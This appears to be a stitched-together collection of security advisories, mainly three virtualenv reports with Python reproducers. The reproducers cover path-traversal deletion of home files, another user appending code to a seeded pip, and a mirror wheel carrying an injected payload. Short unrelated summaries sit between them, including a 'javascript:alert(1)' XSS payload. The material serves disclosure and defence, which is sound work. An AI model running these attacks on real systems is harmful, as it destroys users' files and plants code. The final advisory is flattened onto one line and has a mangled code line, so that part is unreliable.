contained `../../../../../Documents`; its `RECORD` named `../../../../../notes.txt,,`. The user's home initially held
`Documents/thesis/chapter1.txt` and `notes.txt`. Running `virtualenv .venv` exited successfully but removed both paths.
A control tree with `top_level.txt` set to `pip` and a normal `pip/__init__.py` RECORD entry left the home files in
place. The reproducer prints `BUG` only when the control files survive and both attack targets disappear.

The deletion uses the invoking user's permissions and runs during creation, before any use of the environment. It
requires an existing destination that another account could populate; a fresh empty environment does not supply hostile
metadata. The report traces this cleanup to #2186, first released in 20.8.1.
[PR #3428](https://github.com/pypa/virtualenv/pull/3428) checks each deletion path against the resolved environment root
and refuses to delete the root itself.

## Attack sequence

```mermaid
sequenceDiagram
    participant A as Prepared .venv metadata
    participant V as App-data seeder
    participant P as site-packages
    participant H as User home
    A->>P: top_level.txt names ../../../../../Documents
    A->>P: RECORD names ../../../../../notes.txt
    V->>P: read pip-1.0.dist-info before reinstall
    P->>H: join entries without containment check
    V->>H: remove Documents and notes.txt
    V-->>A: virtualenv exits successfully
```

## Reproducer files

The following files are from the scanner report for `ANT-2026-SXOEHWP7`. They were tested against commit `a857a7823c73`
in the scanner image. The `repro` entrypoint expects companion files under `/tmp/repro.d`; cases that change user IDs
need a disposable root-capable container. The last output line is `BUG` when the reported behavior occurs. These files
are included as evidence and were not rerun for this advisory update.

**`repro`**

```text
#!/usr/bin/env python3
import os
import shutil
import subprocess
import sys
from pathlib import Path

work = Path("/tmp/repro-seed-uninstall")
shutil.rmtree(work, ignore_errors=True)
USER_FILES = ("Documents/thesis/chapter1.txt", "notes.txt")


def make_home(name):
    home = work / name
    (home / "Documents" / "thesis").mkdir(parents=True)
    (home / "Documents" / "thesis" / "chapter1.txt").write_text("months of work\n")
    (home / "notes.txt").write_text("my notes\n")
    return home


def unpack_attacker_project(home, top_level_line, record_line):
    subprocess.run(
        [sys.executable, "/tmp/repro.d/make_project_tree.py", home / "project", top_level_line, record_line],
        check=True,
    )


def user_runs_virtualenv(home):
    # HOME only gives each run its own ~ and app-data; --no-periodic-update keeps the run offline
    result = subprocess.run(
        ["virtualenv", "--no-periodic-update", ".venv"],
        cwd=home / "project",
        env={**os.environ, "HOME": str(home)},
        stdout=subprocess.PIPE,
        text=True,
        check=True,
    )
    print(result.stdout, end="")


def files_left(home):
    return [f for f in USER_FILES if (home / f).exists()]


# control: the project ships well-formed pip metadata
control_home = make_home("control")
unpack_attacker_project(control_home, "pip", "pip/__init__.py,,")
user_runs_virtualenv(control_home)
control_left = files_left(control_home)
print(f"CONTROL  user files still in ~ after virtualenv: {control_left}")

# attack: site-packages is ~/project/.venv/lib/python3.X/site-packages, so five ".." is ~
attack_home = make_home("attack")
unpack_attacker_project(attack_home, "../../../../../Documents", "../../../../../notes.txt,,")
print(f"BEFORE   user files in ~ before virtualenv: {files_left(attack_home)}")
user_runs_virtualenv(attack_home)
attack_left = files_left(attack_home)
print(f"OBSERVED user files still in ~ after virtualenv: {attack_left}")

# check: creating an environment must never delete the user's files outside it
print("BUG" if control_left == list(USER_FILES) and attack_left == [] else "OK")
```

**`repro.d/make_project_tree.py`**

```text
#!/usr/bin/env python3
import sys
from pathlib import Path

project = Path(sys.argv[1])
top_level_line = sys.argv[2]
record_line = sys.argv[3]

project.mkdir(parents=True)
(project / "README").write_text("Set up with: virtualenv .venv\n")

# a leftover .venv claiming pip 1.0 is installed; one copy per lib/python3.X, as the victim's Python is unknown
for minor in range(9, 16):
    dist_info = project / ".venv" / "lib" / f"python3.{minor}" / "site-packages" / "pip-1.0.dist-info"
    dist_info.mkdir(parents=True)
    (dist_info / "top_level.txt").write_text(top_level_line + "\n")
    (dist_info / "RECORD").write_text(record_line + "\n")
```

## Impact

Seed cleanup can delete files outside the environment or the environment root itself. The invoking user must have
deletion rights over those paths.

Severity: medium. CVSS 4.5, `CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:L`, assigned during maintainer review.

## Versions tested

The confirmed release is 21.14.8. The affected range records that release only; it does not establish the first affected
version or exclude earlier releases. Fixed in 21.14.9.

The fix skips cleanup paths outside the resolved environment root, and the root itself, with a warning. Final
links are removed without following their targets; parent links participate in containment checks.

Fix: [PR #3428](https://github.com/pypa/virtualenv/pull/3428).

## Known mitigation

Recreate environments from a trusted empty destination rather than reseeding a tree with untrusted installed metadata.

## Affected release

- [x] The problem reproduces on virtualenv 21.14.8.

## Credits

Reported by Anthropic's OSS Scanner as ANT-2026-SXOEHWP7.

items.summary: Twisted is an event-based framework for internet applications, supporting Python 3.6+. Prior to 26.10.0rc1, twisted.web.http.HTTPChannel.headerReceived rejects a NUL byte in an HTTP header value but accepts a bare carriage return or bare line feed. Because Twisted splits header lines only on CRLF, a hidden Content-Length header can remain folded into another value while a lenient front end treats the bare character as a line terminator. The resulting framing disagreement can smuggle a following request past front-end access controls, poison a shared connection or cache, and expose a later client to the wrong response. items.summary:
## Summary

The app-data copy seeder uses shutil.copy, which preserves cached file modes independently of the current umask. A cache
populated under permissive permissions can therefore produce files with wider access in later environments.

Anthropic's OSS Scanner reported this as `ANT-2026-487MH6OW` in `virtualenv-20261015-005`, received on 15 October 2026.

## Affected area

Permissions of files copied from app-data into a new environment.

## Attacker-controlled input

The cache must contain files created with broader permissions than the current environment creator intends. Another
account must also be able to traverse the new environment and reach those files. A private parent directory prevents
that access. No control of a private live cache is assumed.

## Affected code

The relevant 21.14.8 source is in
[copy helpers](https://github.com/pypa/virtualenv/blob/a795ab116356afde11039cf2763d77e8a06da738/src/virtualenv/util/path/_sync.py).

## Mechanism

The default app-data seeder extracts a wheel into a reusable cache and copies its files into later environments with
`shutil.copy()`. That function applies the cached source mode to each destination file after creating it, overriding the
current run's umask. If the cache image was built under umask `000`, a later environment created under umask `022` can
receive mode-`0666` pip files. The cache may be private while the new environment is reachable by other local accounts.

## Reproduction and evidence

The scanner created two histories with separate private app-data caches. In the control, the owner's first run used
umask `022`; a later environment had no files writable by another account, and that account could not append to
`pip/__init__.py`. In the attack history, the first run used umask `000` and the later run still used `022`. The report
counted 478 of 493 environment files writable by others. A second unprivileged uid appended a line to pip, and
`bin/pip --version` ran it as the environment owner. The cache itself remained under a mode-`0700` home in both
histories.

An attacker cannot force the owner's earlier umask through this finding; the attack also needs a traversable
destination. A mode-`002` cache can expose group write access under suitable group permissions. The scanner dates
app-data copy seeding to #1578, first released in 20.0.2. [PR #3425](https://github.com/pypa/virtualenv/pull/3425)
creates copied files under a fixed non-writable-by-others policy further restricted by the current umask.

## Attack sequence

```mermaid
sequenceDiagram
    participant U as Environment owner
    participant C as Private app-data cache
    participant E as Later environment
    participant A as Other local account
    U->>C: first seed extraction under umask 000
    C-->>U: cached pip files have mode 0666
    U->>E: create environment under umask 022
    C->>E: shutil.copy reapplies mode 0666
    A->>E: append code to pip/__init__.py
    U->>E: run bin/pip --version
    E-->>U: appended code runs as owner
```

## Reproducer files

The following files are from the scanner report for `ANT-2026-487MH6OW`. They were tested against commit `a857a7823c73`
in the scanner image. The `repro` entrypoint expects companion files under `/tmp/repro.d`; cases that change user IDs
need a disposable root-capable container. The last output line is `BUG` when the reported behavior occurs. These files
are included as evidence and were not rerun for this advisory update.

**`repro`**

```text
#!/usr/bin/env python3
import glob
import os
import shutil
import stat
import subprocess
import sys
from pathlib import Path

sys.stdout.reconfigure(line_buffering=True)  # keep these lines in order with those of the child processes
os.umask(0o022)  # for the directories made here as root
OWNER, OTHER_USER = 1000, 65534  # root is only needed to switch to these two unprivileged uids
VIRTUALENV = ["virtualenv", "--quiet", "--no-periodic-update"]  # default seeder; no network for the update check
# read here, as root: /tmp/repro.d need not be readable by the other user
ATTACK = Path("/tmp/repro.d/other_user_appends_to_pip.py").read_text()


def run_as_owner(command, home, umask):
    environ = {"HOME": str(home), "PATH": os.environ["PATH"]}
    subprocess.run(command, user=OWNER, group=OWNER, extra_groups=[], umask=umask, env=environ, cwd=home, check=True)


def mode(path):
    return stat.filemode(os.stat(path).st_mode)


work = Path("/tmp/seed-mode-repro")
shutil.rmtree(work, ignore_errors=True)
work.mkdir()
proofs = work / "proofs"
proofs.mkdir()
proofs.chmod(0o777)  # the other user's line writes the uid it runs as in here

writable_by_others, appended_line_ran_as = {}, {}
# the two histories differ only in the umask of the owner's earlier run, the one that fills ~/.cache/virtualenv
for case, umask_of_earlier_run in [("CONTROL", 0o022), ("OBSERVED", 0o000)]:
    # set up: the owner's home, and with it the cache, is private; the project folder is reachable by path
    home = work / f"{case}-home"
    home.mkdir(mode=0o700)
    os.chown(home, OWNER, OWNER)
    projects = work / f"{case}-projects"
    projects.mkdir(mode=0o755)
    os.chown(projects, OWNER, OWNER)

    # owner, some time ago: the first run, with an empty cache, extracts the pip wheel into it
    run_as_owner([*VIRTUALENV, str(home / "earlier-env")], home, umask=umask_of_earlier_run)
    # owner, today
    env = projects / "env"
    run_as_owner([*VIRTUALENV, str(env)], home, umask=0o022)

    (cached_pip,) = glob.glob(f"{home}/.cache/virtualenv/wheel/*/image/1/CopyPipInstall/pip-*/pip/__init__.py")
    (seeded_pip,) = glob.glob(f"{env}/lib/python*/site-packages/pip/__init__.py")
    env_files = [path for path in env.rglob("*") if path.is_file() and not path.is_symlink()]
    writable_by_others[case] = sum(1 for path in env_files if path.stat().st_mode & stat.S_IWOTH)
    print(f"{case} earlier run under umask {umask_of_earlier_run:03o}, env created under umask 022")
    print(f"{case}   cache pip/__init__.py  {mode(cached_pip)}")
    print(f"{case}   env   pyvenv.cfg       {mode(env / 'pyvenv.cfg')}")
    print(f"{case}   env   bin/activate     {mode(env / 'bin' / 'activate')}")
    print(f"{case}   env   pip/__init__.py  {mode(seeded_pip)}")
    print(f"{case}   env files writable by others: {writable_by_others[case]} of {len(env_files)}")

    # attack: another local user appends a line to the owner's seeded pip
    proof = proofs / case
    subprocess.run(
        ["python3", "-", str(env), str(proof)],
        input=ATTACK,
        text=True,
        user=OTHER_USER,
        group=OTHER_USER,
        extra_groups=[],
        env={"PATH": os.environ["PATH"]},
        cwd="/",
        check=True,
    )

    # the owner uses the environment
    run_as_owner([str(env / "bin" / "pip"), "--version"], home, umask=0o022)
    appended_line_ran_as[case] = proof.read_text() if proof.exists() else None
    print(f"{case}   other user's line ran as uid: {appended_line_ran_as[case]}")

# check: the same umask 022 today must give the same modes, whatever umask filled the cache earlier
control_is_private = writable_by_others["CONTROL"] == 0 and appended_line_ran_as["CONTROL"] is None
observed_runs_as_owner = writable_by_others["OBSERVED"] > 0 and appended_line_ran_as["OBSERVED"] == str(OWNER)
print("BUG" if control_is_private and observed_runs_as_owner else "OK")
```

**`repro.d/other_user_appends_to_pip.py`**

```text
import glob
import sys

environment, proof = sys.argv[1:]
(pip_init,) = glob.glob(f"{environment}/lib/python*/site-packages/pip/__init__.py")
added_line = f"\nimport os; open({proof!r}, 'w').write(str(os.getuid()))\n"

try:
    with open(pip_init, "a") as pip_source:
        pip_source.write(added_line)
    print(f"other user: appended a line to {pip_init}")
except PermissionError as error:
    print(f"other user: {error}")
```

## Impact

Copied seed files can remain readable or writable by other accounts despite the current umask. Exposure requires those
accounts to be able to traverse the destination's parent directories. An attacker need not control the private source
cache.

Severity: low.

## Versions tested

The confirmed release is 21.14.8. The affected range records that release only; it does not establish the first affected
version or exclude earlier releases. Fixed in 21.14.9.

The fix creates destination files with mode `0644`, or `0755` for executable sources, filtered further by the
current umask. It does not grant group or world write access, even with a permissive umask. Source modes are not
preserved, including modes more restrictive than this creation policy.

Fix: [PR #3425](https://github.com/pypa/virtualenv/pull/3425).

## Known mitigation

Create environments beneath a directory accessible only to their owner. Recreate environments whose permissions were
inherited from a permissive cache.

## Affected release

- [x] The problem reproduces on virtualenv 21.14.8.

## Credits

Reported by Anthropic's OSS Scanner as ANT-2026-487MH6OW.

items.summary:
Apache Airflow's secrets masker hides values stored under sensitive key names when they are displayed in the UI. The masker's recursion-depth limit did not descend into values nested inside a list, tuple, or set beyond that limit, so an Airflow Variable holding such a deeply-nested value was shown unmasked in the Variables UI. The exposure is limited to the UI: any authenticated user who can see the Variable in the UI can already read its full value through the Variables REST API, so this does not disclose data the user could not otherwise obtain — the masking is a shoulder-surfing defense for the UI, not an access-control boundary.

This is an incomplete-fix follow-up to CVE-2026-42358, whose fix made only the dictionary walk unbounded; lists, tuples, and sets beyond the depth limit remained unmasked in the UI. Deployments that applied the CVE-2026-42358 fix should also upgrade to address this residual case. Upgrade to apache-airflow 3.3.1 or later.

### Impact
Bridge tool results filtered only the `items` array against the read ACL and passed sibling fields through unfiltered: `tasks_filter` emitted `groups` whose counts reflected denied notes, `makemd_query` returned `...result` siblings, and `list_templates` enumerated Templater template paths and parsed user-function bodies with no read-whitelist gate. A caller could infer or read data from notes outside its read ACL.

### Patches
Fixed in **1.3.1**. Upgrade to `>= 1.3.1`. All path-attributable fields are now scrubbed or fail-closed, and `list_templates` is gated on the read whitelist.

### Workarounds
Disable the affected bridge tools (`tasks_filter`, `makemd_query`, `list_templates`) via tool visibility.

items.summary: The Goobi viewer is a web application that allows digitised material to be displayed in a web browser. Prior to version 26.05, the legacy RSS servlet (RssResolver, GET /rss/) accepts the q and filterQuery parameters and concatenates them into Solr queries without validation. items.summary: Isar is an integration system for automated root filesystem generation. In versions 0.11 and newer, /etc/apt/trusted.gpg.d is created manually during bootstrap setup to be able to deploy local keys. By that, the directory is owned by the calling user (the one that executes Isar) instead of root. If the calling user's id is identical to one of an unprivileged user inside the image, this user is able to alter existing keys and deploy new ones, silently breaking the apt repo integrity protection. The issue is has no impact on those images that use an immutable rootfs, or if apt is never invoked. Changing only the keys does not trigger an exploit, it's just one step in a chain. An attacker would also have to manipulate a remote repo or intercept non-secure communication with it. This issue has been patched via commit 29e84ed.

items.summary:
### Impact

`fast-uri`'s `serialize()`, `normalize()`, and `resolve()`, when called with the non-default option `reference: 'suffix'` on a reference that has no authority, emit a relative reference whose first path segment contains a bare colon without escaping it. RFC 3986 section 3.3 requires the first segment of a `path-noscheme` reference not to contain a colon, precisely because a bare colon makes the string reparse as an absolute URI with a scheme. `fast-uri`'s default serialization escapes that colon, but the suffix path does not.

For example, `normalize('javascript:alert(1)', { reference: 'suffix' })` returns `javascript:alert(1)`, which reparses as a live `javascript:` scheme; `data:` and `vbscript:` behave the same.

Applications that serialize or normalize a relative reference with `reference: 'suffix'` and then treat the result as a URI can turn inert input into a live `javascript:`, `data:`, or `vbscript:` URL (a cross-site scripting vector), and `equal()` can conflate a scheme-bearing reference with a relative one. Exposure is limited to applications that use the non-default `reference: 'suffix'` option.

### Patches

Upgrade to `fast-uri` `2.4.8`, `3.1.9`, or `4.2.3`.

### Workarounds

Do not use the `reference: 'suffix'` option on untrusted input. If suffix output is required, percent-encode a colon in the first path segment of the result before treating it as a URI.

items.summary:
### Impact

`fast-uri`'s `normalize()` and `serialize()` apply RFC 3986 dot-segment removal (`remove_dot_segments`) to the path of a relative-path reference. RFC 3986 section 5.2.4 defines that algorithm only for the merged target path during resolution, not for the reference itself, so applied to the reference it drops leading `..` segments and can turn a document-relative reference into a root-relative one.

For example, `normalize('a/../b')` returns `/b` and `normalize('../x')` returns `x`, so `resolve(base, normalize(ref))` points at a different resource than `resolve(base, ref)`, and `equal()` treats distinct references as the same.

Applications that normalize attacker-supplied or user-supplied relative references and then resolve them, or use them as cache, deduplication, or authorization keys, can have a reference escape its intended directory and point at a different resource.

### Patches

Upgrade to `fast-uri` `2.4.8`, `3.1.9`, or `4.2.3`.

### Workarounds

Do not normalize a relative reference before resolving it. Resolve it against the absolute base first, then normalize the absolute result.

items.summary:
A flaw in Node.js `crypto` causes the internal entropy caches used by `crypto.randomUUID()`, `crypto.randomUUIDv7()`, and `crypto.randomInt()` to be saved into user-land startup snapshots (`--build-snapshot`) and single executable applications built with `useSnapshot`.

If any of these functions, or an API that relies on them such as `URL.createObjectURL()`, is called while the snapshot is built, every process started from that snapshot returns the same values until the cache is refilled: up to 127 UUIDs and about 1,000 `randomInt()` values. Identifiers expected to be unique can collide across processes, and values issued by one process can be predicted by observing another.

This vulnerability affects Node.js **26.x**, **24.x**, and **22.x**.

items.summary:
The RTIO streaming completion callback adxl345_process_fifo_samples_cb() in drivers/sensor/adi/adxl345/adxl345_stream.c clamps the amount of FIFO data it will report (read_len = MIN(fifo_bytes, buf_avail)) to the space actually returned by rtio_sqe_rx_buf(), but then queues one 6-byte bus read per hardware FIFO entry at consecutive offsets from read_buf, bounded by the device-reported entry count rather than by the clamp. When the allocated buffer is smaller than a full batch, the driver writes up to 186 bytes past the end of the allocation; a companion defect left data->fifo_total_bytes un-reset at batch start, so an aborted or errored chain could leave a stale write offset that pushes the next batch's writes out of bounds as well.

A short buffer is an expected, first-class outcome of the RTIO allocator: rtio_block_pool_alloc() walks the requested size down one block at a time until a contiguous run is available, and the driver only demands sizeof(struct adxl345_fifo_data) + 6 bytes as its minimum. Any streaming configuration whose mempool block granularity is smaller than a full FIFO batch (204 bytes) — for example the sensor shell's RTIO_DEFINE_WITH_MEMPOOL(sensor_read_rtio, 8, 8, 32, 64, 4) used by sensor stream <dev> on fifo_wm incl, or the 16-byte-block streaming example in the documentation — takes this path whenever the pool is fragmented or the consuming thread falls behind.

The out-of-bounds writes are performed by the I2C/SPI RTIO backend (DMA on many SoCs) into the shared RTIO block pool, corrupting neighbouring live buffers or, for a pool smaller than one batch, memory beyond the pool itself. The written bytes are accelerometer samples and the destination follows the allocation, so there is no controllable corruption primitive: the realistic impact is silent corruption of other RTIO consumers' data or a crash. Reaching it requires a board with an interrupt-wired ADXL345 built with CONFIG_ADXL345_STREAM, plus buffer-pool starvation, which a co-resident local workload can induce but which also occurs spontaneously under load; there is no network, USB or radio path to this code.

items.summary: Twisted is an event-based framework for internet applications, supporting Python 3.6+. Prior to 26.10.0rc1, twisted.names.dns.DNSDatagramProtocol accepts a UDP DNS response for a pending query when its 16-bit transaction ID matches but does not verify that the response came from the queried host and port. An attacker able to deliver a packet to the resolver's listening port with the correct transaction ID can inject a forged answer. The standard twisted.names.client.Resolver uses a new random source port for each query, increasing off-path attack complexity, while applications that reuse a DNSDatagramProtocol instance expose only the transaction-ID search space after the first query. A successful forgery can redirect hostname resolution and enable mail interception, server-side request forgery, or man-in-the-middle positioning. This issue is fixed in version 26.10.0rc1.

items.summary:
A flaw in the Node.js `zlib.ZipFile` API can cause it to return bytes that do not belong to the requested entry after the local and central header validation fails.

When `zipEntry.modified` is read on an archive whose local header does not match its central directory, either directly or while compacting the archive, the validation error is caught but the parsed local header is left cached without a content offset. A later content read then returns attacker-controlled bytes from the start of the file instead of rejecting the archive, and CRC-32 verification still passes because the attacker controls the central directory CRC. A Node.js-based scanner can therefore approve different content from what another ZIP implementation extracts from the same archive.

This vulnerability affects Node.js **26.x**.

items.summary:
Zephyr's Bluetooth Mesh subnet key management leaks one PSA Crypto key slot on every subnet-key teardown. In subsys/bluetooth/mesh/subnet.c, net_keys_create() imports the Private Beacon Key into a PSA key slot under CONFIG_BT_MESH_PRIV_BEACONS (enabled by default), but subnet_keys_destroy() guarded the matching psa_destroy_key() with CONFIG_BT_MESH_V1d1. That Kconfig symbol was removed when explicit Mesh 1.0.1 support was dropped, so the destroy branch became permanently dead code and the import is never balanced by a destroy.

The imbalanced teardown is reached every time subnet keys are destroyed: deleting a subnet (Config Server NetKey Delete), completing a Key Refresh Procedure (which retires the old key set), and resetting/re-provisioning the node. The over-the-air triggers are processed only under the node's device key, so they are exercisable by the provisioner or network administrator that owns the node, reachable over the Bluetooth Mesh network.

With the default CONFIG_MBEDTLS_PSA_KEY_SLOT_COUNT of 16, repeated add/delete or key-refresh cycles exhaust the shared PSA key-slot pool after roughly a dozen rounds. Once exhausted, bt_mesh_private_beacon_key() and thus subnet creation fail: the node can no longer add subnets or complete key refresh, and other PSA crypto consumers on the device may be starved, until the device is rebooted. The fix aligns the destroy guard with the import guard (CONFIG_BT_MESH_PRIV_BEACONS) so each slot is freed.

items.summary:
### Impact

Applications that prerender pages and use `setHeaders` to set a `cache-control` header from an untrusted source are vulnerable to cross-site scripting (XSS).

SvelteKit inserts the header value into a `<meta http-equiv="cache-control">` tag without escaping it. An attacker who can influence this value at prerender time can break out of the `content` attribute and inject HTML or JavaScript into the generated page. The injected code can then execute when users visit the page.

### Patches

The fix escapes the header value before inserting it into the generated HTML. Upgrade to `@sveltejs/kit` version 3.0.0 or later.

### Workarounds

Avoid forwarding untrusted `cache-control` header values with `setHeaders` on prerendered pages. Use a fixed, trusted cache policy instead.

Explicit custom-index settings already opt out of comparison against PyPI metadata; this patch retains that policy. ## Affected code The relevant 21.14.8 source is in [pip seeder](https://github.com/pypa/virtualenv/blob/a795ab116356afde11039cf2763d77e8a06da738/src/virtualenv/seed/embed/pip_invoke.py). ## Mechanism With `--seeder pip --download`, `PipInvoke.get_pip_install_cmd()` first calls `get_wheel(download=False)`, so virtualenv's `download_wheel()` and `verify_wheel_digest()` are skipped. It then lets `pip install` consult the configured index. An index wheel with the same package and version as the bundled wheel can be selected without virtualenv comparing its SHA-256 with PyPI metadata. The default app-data seeder takes the verification path for the same option. ## Reproduction and evidence The scanner built a local index named in `pip.conf` that served a modified copy of the bundled pip wheel under the same filename. In the control run, `virtualenv --download env-default` rejected the wheel with a digest mismatch. In the second run, adding `--seeder pip` produced an environment whose installed `pip/__init__.py` matched the index wheel; `env-pip/bin/pip --version` ran the added line. The reproducer checked the installed bytes and marker before reporting `BUG`. Both `--seeder pip` and `--download` are needed. The report used a non-PyPI index from `pip.conf` and left `PIP_INDEX_URL`, `PIP_EXTRA_INDEX_URL`, and `PIP_INDEX` unset, so virtualenv's default-seeder PyPI comparison remained active. This does not establish index control in the default PyPI setup. The unchecked pip-seeder download path is older, while the comparison with the default seeder arose when digest verification was added in 21.7.12. [PR #3430](https://github.com/pypa/virtualenv/pull/3430) acquires and verifies selected wheels before invoking pip with index lookup disabled. ## Attack sequence ```mermaid sequenceDiagram participant I as Index in pip.conf participant V as virtualenv PipInvoke participant P as pip install participant E as Seeded environment I->>V: serve modified pip wheel V->>V: get_wheel(download=False) V->>P: install with --download permitting index lookup P->>I: select same-version index wheel I->>E: modified pip installed without virtualenv digest check E->>E: later pip invocation runs added code Note over V,E: Default app-data seeder rejects the same digest ``` ## Reproducer files The following files are from the scanner report for `ANT-2026-74ALJBUF`. They were tested against commit `a857a7823c73` in the scanner image. The `repro` entrypoint expects companion files under `/tmp/repro.d`; cases that change user IDs need a disposable root-capable container. The last output line is `BUG` when the reported behavior occurs. These files are included as evidence and were not rerun for this advisory update. **`repro`** ```text #!/usr/bin/env python3 import glob import hashlib import json import os import shutil import subprocess import sys import zipfile from virtualenv.seed.wheels.embed import get_embed_wheel companions = "/tmp/repro.d" work = "/tmp/repro-pip-seeder-download" shutil.rmtree(work, ignore_errors=True) os.makedirs(work) # set up: the pip wheel virtualenv bundles, and PyPI's record of its sha256 (served by virtualenv_offline.py: no network) bundled = get_embed_wheel("pip", f"{sys.version_info.major}.{sys.version_info.minor}") pypi_sha256 = hashlib.sha256(open(bundled.path, "rb").read()).hexdigest() pypi_release = {"filename": bundled.name, "digests": {"sha256": pypi_sha256}} os.makedirs(f"{work}/pypi.org/pypi/pip") with open(f"{work}/pypi.org/pypi/pip/json", "w") as pypi_json: json.dump({"releases": {bundled.version: [pypi_release]}}, pypi_json) # attacker: the mirror serves other bytes under the bundled wheel's own file name marker = f"{work}/MIRROR_CODE_RAN" subprocess.run([sys.executable, f"{companions}/make_mirror.py", str(bundled.path), f"{work}/mirror", marker], check=True) mirror_wheel = f"{work}/mirror/pip/{bundled.name}" mirror_sha256 = hashlib.sha256(open(mirror_wheel, "rb").read()).hexdigest() print(f"{bundled.name}: PyPI publishes sha256 {pypi_sha256}") print(f"{bundled.name}: the mirror serves sha256 {mirror_sha256}") # user: pip.conf names the mirror; PIP_INDEX_URL, PIP_EXTRA_INDEX_URL and PIP_INDEX (which turn the check off) are unset with open(f"{work}/pip.conf", "w") as pip_conf: pip_conf.write(f"[global]\nindex-url = file://{work}/mirror\n") # file:// stands in for the mirror's http URL os.makedirs(f"{work}/home-default") os.makedirs(f"{work}/home-pip") # one HOME per run, so neither sees the other's app-data or pip cache virtualenv = [sys.executable, f"{companions}/virtualenv_offline.py", f"{work}/pypi.org", "--no-periodic-update"] # control: the default seeder with --download fetches the mirror's wheel and refuses it default_seeder = subprocess.run( [*virtualenv, "--download", f"{work}/env-default"], env={**os.environ, "HOME": f"{work}/home-default", "PIP_CONFIG_FILE": f"{work}/pip.conf"}, capture_output=True, text=True, ) refusal = [line for line in default_seeder.stdout.splitlines() if line.startswith("RuntimeError: ")] print(f"\nCONTROL virtualenv --download env-default: exit {default_seeder.returncode}") print("\n".join(refusal)) # trigger: the same command plus --seeder pip pip_seeder = subprocess.run( [*virtualenv, "--download", "--seeder", "pip", f"{work}/env-pip"], env={**os.environ, "HOME": f"{work}/home-pip", "PIP_CONFIG_FILE": f"{work}/pip.conf"}, capture_output=True, text=True, ) print(f"\nOBSERVED virtualenv --download --seeder pip env-pip: exit {pip_seeder.returncode}") print(pip_seeder.stdout) if pip_seeder.returncode == 0: env_pip = subprocess.run([f"{work}/env-pip/bin/pip", "--version"], capture_output=True, text=True, check=True) print(f"$ env-pip/bin/pip --version\n{env_pip.stdout}") # check: compare env-pip's pip/__init__.py with the one in each wheel with zipfile.ZipFile(bundled.path) as wheel: bundled_init = wheel.read("pip/__init__.py") with zipfile.ZipFile(mirror_wheel) as wheel: mirror_init = wheel.read("pip/__init__.py") installed = glob.glob(f"{work}/env-pip/lib/python*/site-packages/pip/__init__.py") installed_init = open(installed[0], "rb").read() if installed else b"" refusal_message = f"has sha256 {mirror_sha256}, but PyPI reports {pypi_sha256}" refused = default_seeder.returncode != 0 and refusal_message in default_seeder.stdout print(f"default seeder refused the mirror's wheel for its digest: {refused}") print(f"env-pip's pip/__init__.py is the bundled wheel's: {installed_init == bundled_init}, the mirror's: {installed_init == mirror_init}") print(f"the mirror's line ran on env-pip/bin/pip --version: {os.path.exists(marker)}") print("BUG" if refused and installed_init == mirror_init and os.path.exists(marker) else "OK") ``` **`repro.d/make_mirror.py`** ```text #!/usr/bin/env python3 # usage: make_mirror.py import os import sys import zipfile genuine_wheel, mirror, marker = sys.argv[1:] wheel_name = os.path.basename(genuine_wheel) payload = f"\nopen({marker!r}, 'w').write('mirror code ran')\n" os.makedirs(f"{mirror}/pip") with zipfile.ZipFile(genuine_wheel) as genuine, zipfile.ZipFile(f"{mirror}/pip/{wheel_name}", "w") as served: for entry in genuine.infolist(): data = genuine.read(entry) if entry.filename == "pip/__init__.py": data += payload.encode() served.writestr(entry, data) # PEP 503 project page; pip reads /pip/index.html for a file:// index with open(f"{mirror}/pip/index.html", "w") as page: page.write(f'{wheel_name}\n') ``` **`repro.d/virtualenv_offline.py`** ```text #!/usr/bin/env python3 # usage: virtualenv_offline.py # The `virtualenv` command, except that the PyPI JSON API request (the source of the digest the default seeder # checks) is answered from a local file, as tests/unit/seed/wheels/test_periodic_update.py does. pip is not touched. import sys from virtualenv.__main__ import run_with_catch from virtualenv.seed.wheels import periodic_update pypi_org = sys.argv[1] def pypi_json_api(url, context=None): return open(url.replace("https://pypi.org", pypi_org), "rb") periodic_update.urlopen = pypi_json_api run_with_catch(sys.argv[2:]) ``` ## Impact The default-index digest-verification step can be omitted when the pip seeder downloads packages. This does not by itself defeat TLS or establish control of an index response. Severity: low. ## Versions tested The confirmed release is 21.14.8. The affected range records that release only; it does not establish the first affected version or exclude earlier releases. Fixed in 21.14.9. The fix acquires wheels through the shared verification path and installs pinned names with index lookup disabled. A private temporary directory contains only the selected archives. This preserves version pins in pip freeze output. Fix: [PR #3430](https://github.com/pypa/virtualenv/pull/3430). ## Known mitigation On older releases, use embedded wheels without downloads, or acquire and verify approved seed archives separately. ## Affected release - [x] The problem reproduces on virtualenv 21.14.8. ## Credits Reported by Anthropic's OSS Scanner as ANT-2026-74ALJBUF.
